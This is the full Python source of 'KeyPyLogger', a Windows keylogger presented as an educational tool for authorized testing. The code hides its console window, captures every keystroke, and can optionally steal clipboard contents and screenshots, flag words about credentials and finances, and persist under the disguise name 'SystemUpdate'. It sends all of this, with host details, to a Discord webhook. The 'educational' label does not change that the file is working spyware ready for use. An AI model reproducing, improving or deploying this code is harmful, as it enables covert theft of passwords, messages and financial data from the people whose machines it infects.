#!/usr/bin/env python3
"""
KeyPyLogger - Windows Advanced Version
Educational keylogger with advanced features for authorized security testing

Version 2.0 - Advanced Features
"""

import os
import sys
import platform
import threading
import time
import base64
from datetime import datetime, timezone
from pynput import keyboard
import requests
import json

# Hide console window on Windows
if sys.platform == 'win32':
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# Add current directory and parent to path for modules
# This works both when running from src/ and when built by builder
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
root_dir = os.path.dirname(os.path.dirname(current_dir))
sys.path.insert(0, current_dir)  # For build/ directory
sys.path.insert(0, parent_dir)   # For one level up
sys.path.insert(0, root_dir)     # For project root

# Import advanced modules
try:
    from modules.persistence import PersistenceManager
    from modules.clipboard import ClipboardMonitor
    from modules.screenshot import ScreenshotCapture
    from modules.keyword_alerts import KeywordAlertSystem, PresetKeywordLists
    from modules.watchdog import ProcessMonitor, HealthChecker
    from modules.protection import SelfProtection
    ADVANCED_MODULES_AVAILABLE = True
except ImportError as e:
    ADVANCED_MODULES_AVAILABLE = False
    print(f"[!] Advanced modules not found: {e}. Running in basic mode.")

# ============================================================================
# CONFIGURATION - EDIT THESE VALUES BEFORE USE/COMPILING
# ============================================================================
WEBHOOK_URL = "WEBHOOK_URL_PLACEHOLDER"
SEND_INTERVAL = 60  # Send logs every 60 seconds
MAX_BUFFER_SIZE = 1000  # Maximum characters before forcing send

# Advanced Features Configuration
ENABLE_PERSISTENCE = False
ENABLE_CLIPBOARD = False
ENABLE_SCREENSHOTS = False
SCREENSHOT_INTERVAL = 300  # 5 minutes
ENABLE_KEYWORD_ALERTS = False
KEYWORD_LISTS = []  # e.g., ['financial', 'credentials']
ENABLE_SELF_PROTECTION = False
ENABLE_HEALTH_MONITORING = False
PROGRAM_NAME = "SystemUpdate"
# ============================================================================


class AdvancedKeyLogger:
    """
    Advanced keylogger with modular features
    Educational implementation for cybersecurity learning
    """

    def __init__(self, webhook_url, send_interval=60):
        """
        Initialize the advanced keylogger

        Args:
            webhook_url (str): Discord webhook URL
            send_interval (int): Interval in seconds to send logs
        """
        self.webhook_url = webhook_url
        self.send_interval = send_interval
        self.log_buffer = []
        self.running = False
        self.system_info = self._get_system_info()

        # Advanced features
        self.persistence = None
        self.clipboard_monitor = None
        self.screenshot_capture = None
        self.keyword_alerts = None
        self.process_monitor = None
        self.health_checker = None
        self.self_protection = None

        # Data buffers for advanced features
        self.clipboard_buffer = []
        self.screenshot_buffer = []
        self.keyword_alerts_buffer = []

    def _get_system_info(self):
        """Collect basic system information"""
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version()
        }

    def initialize_advanced_features(self):
        """Initialize all enabled advanced features"""
        if not ADVANCED_MODULES_AVAILABLE:
            print("[!] Advanced modules not available")
            return

        # Initialize persistence
        if ENABLE_PERSISTENCE:
            try:
                self.persistence = PersistenceManager(
                    program_name=PROGRAM_NAME,
                    program_path=sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
                )
                if self.persistence.install():
                    print("[+] Persistence installed successfully")
            except Exception as e:
                print(f"[!] Persistence setup failed: {e}")

        # Initialize clipboard monitoring
        if ENABLE_CLIPBOARD:
            try:
                self.clipboard_monitor = ClipboardMonitor(
                    callback=self._on_clipboard_change,
                    check_interval=1
                )
                if self.clipboard_monitor.start():
                    print("[+] Clipboard monitoring started")
            except Exception as e:
                print(f"[!] Clipboard monitoring failed: {e}")

        # Initialize screenshot capture
        if ENABLE_SCREENSHOTS:
            try:
                self.screenshot_capture = ScreenshotCapture(
                    callback=self._on_screenshot_taken,
                    interval=SCREENSHOT_INTERVAL,
                    quality=85,  # Higher quality (1-100)
                    max_size=(1920, 1080)  # Full HD resolution
                )
                if self.screenshot_capture.start():
                    print("[+] Screenshot capture started")
            except Exception as e:
                print(f"[!] Screenshot capture failed: {e}")

        # Initialize keyword alerts
        if ENABLE_KEYWORD_ALERTS:
            try:
                # Collect keywords from preset lists
                all_keywords = []
                for list_name in KEYWORD_LISTS:
                    if hasattr(PresetKeywordLists, list_name.upper()):
                        keywords = getattr(PresetKeywordLists, list_name.upper())
                        all_keywords.extend(keywords)

                self.keyword_alerts = KeywordAlertSystem(
                    keywords=all_keywords,
                    alert_callback=self._on_keyword_detected
                )

                print("[+] Keyword alerts initialized")
            except Exception as e:
                print(f"[!] Keyword alerts failed: {e}")

        # Initialize self-protection
        if ENABLE_SELF_PROTECTION:
            try:
                self.self_protection = SelfProtection()
                self.self_protection.enable_all_protections()
                print("[+] Self-protection enabled")
            except Exception as e:
                print(f"[!] Self-protection failed: {e}")

        # Initialize health monitoring
        if ENABLE_HEALTH_MONITORING:
            try:
                self.health_checker = HealthChecker(
                    callback=self._on_health_update,
                    check_interval=300
                )
                self.health_checker.start()
                print("[+] Health monitoring started")
            except Exception as e:
                print(f"[!] Health monitoring failed: {e}")

    def _format_key(self, key):
        """Format key press for logging"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            else:
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.shift_r: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.ctrl_r: '[CTRL]',
                    keyboard.Key.alt: '[ALT]',
                    keyboard.Key.alt_r: '[ALT]',
                    keyboard.Key.caps_lock: '[CAPS]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.up: '[UP]',
                    keyboard.Key.down: '[DOWN]',
                    keyboard.Key.left: '[LEFT]',
                    keyboard.Key.right: '[RIGHT]',
                }
                return special_keys.get(key, f'[{str(key).replace("Key.", "")}]')
        except Exception as e:
            return f'[ERROR:{str(e)}]'

    def _on_press(self, key):
        """Callback for key press events"""
        try:
            formatted_key = self._format_key(key)
            self.log_buffer.append(formatted_key)

            # Check for keywords if enabled
            if self.keyword_alerts and ENABLE_KEYWORD_ALERTS:
                self.keyword_alerts.check_text(formatted_key)

            if len(''.join(self.log_buffer)) >= MAX_BUFFER_SIZE:
                self._send_logs()

        except Exception as e:
            pass  # Silent fail in production

    def _on_clipboard_change(self, timestamp, content):
        """Callback for clipboard changes"""
        self.clipboard_buffer.append({
            "timestamp": timestamp,
            "content": content[:500]  # Limit content size
        })

    def _on_screenshot_taken(self, timestamp, image_data, size=None):
        """Callback for screenshot capture"""
        self.screenshot_buffer.append({
            "timestamp": timestamp,
            "image": base64.b64encode(image_data).decode('utf-8')[:50000]  # Limit size
        })

    def _on_keyword_detected(self, keyword, context, timestamp=None):
        """Callback for keyword detection"""
        self.keyword_alerts_buffer.append({
            "timestamp": timestamp or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "keyword": keyword,
            "context": context[:200]
        })

    def _on_health_update(self, health_info):
        """Callback for health monitoring updates"""
        try:
            embed = {
                "title": "💚 Health Status",
                "color": 3066993,
                "fields": [
                    {"name": "CPU Usage", "value": f"{health_info.get('cpu_percent', 0):.1f}%", "inline": True},
                    {"name": "Memory", "value": f"{health_info.get('memory_mb', 0):.1f} MB", "inline": True},
                    {"name": "Uptime", "value": f"{health_info.get('uptime_seconds', 0):.0f}s", "inline": True},
                ],
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            payload = {"username": "KeyPyLogger Health", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)
        except:
            pass

    def _send_logs(self):
        """Send accumulated logs to Discord webhook"""
        if not self.log_buffer and not self.clipboard_buffer and not self.screenshot_buffer and not self.keyword_alerts_buffer:
            return

        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            embeds = []

            # Main keylog embed
            if self.log_buffer:
                log_content = ''.join(self.log_buffer)
                if log_content.strip():
                    embed = {
                        "title": f"🔑 Keylog Report - {self.system_info['hostname']}",
                        "description": f"```\n{log_content[:4000]}\n```",
                        "color": 3447003,
                        "fields": [
                            {
                                "name": "System",
                                "value": f"{self.system_info['os']} {self.system_info['architecture']}",
                                "inline": True
                            },
                            {
                                "name": "Timestamp",
                                "value": timestamp,
                                "inline": True
                            },
                            {
                                "name": "Buffer Size",
                                "value": f"{len(log_content)} characters",
                                "inline": True
                            }
                        ],
                        "footer": {
                            "text": "KeyPyLogger Advanced - Educational Purpose Only"
                        }
                    }
                    embeds.append(embed)
                    self.log_buffer = []

            # Clipboard embed
            if self.clipboard_buffer:
                clipboard_text = "\n".join([f"[{c['timestamp']}] {c['content']}" for c in self.clipboard_buffer[:5]])
                embed = {
                    "title": "📋 Clipboard Activity",
                    "description": f"```\n{clipboard_text}\n```",
                    "color": 15844367,
                    "timestamp": datetime.now(timezone.utc).isoformat()
                }
                embeds.append(embed)
                self.clipboard_buffer = []

            # Keyword alerts embed
            if self.keyword_alerts_buffer:
                alerts_text = "\n".join([f"[{a['timestamp']}] {a['keyword']}: {a['context']}" for a in self.keyword_alerts_buffer[:5]])
                embed = {
                    "title": "⚠️ Keyword Alerts",
                    "description": f"```\n{alerts_text}\n```",
                    "color": 15158332,
                    "timestamp": datetime.now(timezone.utc).isoformat()
                }
                embeds.append(embed)
                self.keyword_alerts_buffer = []

            # Send embeds
            if embeds:
                payload = {
                    "username": "KeyPyLogger Advanced",
                    "embeds": embeds[:10]  # Discord limit
                }

                response = requests.post(
                    self.webhook_url,
                    json=payload,
                    timeout=10
                )

            # Send screenshots separately as files (Discord doesn't support base64 in embeds)
            if self.screenshot_buffer:
                for idx, screenshot in enumerate(self.screenshot_buffer[:2]):  # Limit to 2 per batch
                    try:
                        # Decode base64 image
                        image_bytes = base64.b64decode(screenshot['image'])

                        # Create multipart form data with file
                        files = {
                            'file': (f'screenshot_{screenshot["timestamp"]}.png', image_bytes, 'image/png')
                        }

                        # Create payload with embed
                        payload = {
                            "content": f"📸 Screenshot captured at {screenshot['timestamp']}",
                            "username": "KeyPyLogger Screenshots"
                        }

                        # Send as multipart/form-data
                        requests.post(
                            self.webhook_url,
                            data={"payload_json": json.dumps(payload)},
                            files=files,
                            timeout=30
                        )
                    except Exception as e:
                        # Log error silently in production
                        pass
                self.screenshot_buffer = []

        except Exception as e:
            pass  # Silent fail in production

    def _periodic_send(self):
        """Periodically send logs at specified interval"""
        while self.running:
            time.sleep(self.send_interval)
            if self.running:
                self._send_logs()

    def start(self):
        """Start the keylogger"""
        self._send_initial_info()
        self.initialize_advanced_features()

        self.running = True
        send_thread = threading.Thread(target=self._periodic_send, daemon=True)
        send_thread.start()

        try:
            with keyboard.Listener(on_press=self._on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the keylogger and send remaining logs"""
        self.running = False

        # Stop all advanced features
        if self.clipboard_monitor:
            self.clipboard_monitor.stop()
        if self.screenshot_capture:
            self.screenshot_capture.stop()
        if self.health_checker:
            self.health_checker.stop()

        # Send remaining logs
        self._send_logs()

    def _send_initial_info(self):
        """Send initial system information"""
        try:
            features_enabled = []
            if ENABLE_PERSISTENCE:
                features_enabled.append("Persistence")
            if ENABLE_CLIPBOARD:
                features_enabled.append("Clipboard")
            if ENABLE_SCREENSHOTS:
                features_enabled.append("Screenshots")
            if ENABLE_KEYWORD_ALERTS:
                features_enabled.append("Keyword Alerts")
            if ENABLE_SELF_PROTECTION:
                features_enabled.append("Self-Protection")
            if ENABLE_HEALTH_MONITORING:
                features_enabled.append("Health Monitoring")

            embed = {
                "title": "🚀 KeyPyLogger Advanced Started",
                "color": 5763719,
                "fields": [
                    {"name": "Hostname", "value": self.system_info['hostname'], "inline": True},
                    {"name": "OS", "value": self.system_info['os'], "inline": True},
                    {"name": "Architecture", "value": self.system_info['architecture'], "inline": True},
                    {"name": "OS Version", "value": self.system_info['os_version'][:100], "inline": False},
                    {"name": "Python Version", "value": self.system_info['python_version'], "inline": True},
                    {"name": "Features Enabled", "value": ", ".join(features_enabled) if features_enabled else "Basic Mode", "inline": False},
                ],
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "footer": {"text": "KeyPyLogger Advanced - Educational Purpose Only"}
            }

            payload = {"username": "KeyPyLogger Advanced", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)

        except Exception as e:
            pass  # Silent fail


def main():
    """Main entry point"""
    # Validate webhook
    if not WEBHOOK_URL or "discord.com/api/webhooks" not in WEBHOOK_URL:
        print("[!] ERROR: Invalid webhook URL!")
        print("[!] Please edit the WEBHOOK_URL in this script")
        sys.exit(1)

    # Create and start keylogger
    logger = AdvancedKeyLogger(WEBHOOK_URL, SEND_INTERVAL)

    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        logger.stop()


if __name__ == "__main__":
    main()
